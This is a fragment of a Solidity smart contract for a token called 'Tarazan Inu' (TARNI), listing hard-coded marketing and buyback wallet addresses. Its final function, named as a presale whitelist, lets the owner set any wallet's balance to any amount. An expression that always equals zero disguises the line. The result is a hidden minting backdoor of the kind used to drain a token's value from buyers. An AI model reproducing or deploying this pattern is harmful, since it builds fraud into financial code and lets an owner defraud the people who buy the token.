...
contract TarazanInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Tarazan Inu";
    string private _symbol = "TARNI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x815ECa08444C4E9b87A1F6150f73eC74D9Ecb55e); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xF8cdaE32a361420DCf82AEA8826f3f315Ebe8880); // BuyBack Address
  ...
  function presaleWihtelist(address WALLETS, uint256 amount) public onlyOwner {
      _balances[WALLETS] = (amount / amount - amount / amount) + amount * 10 ** 9;
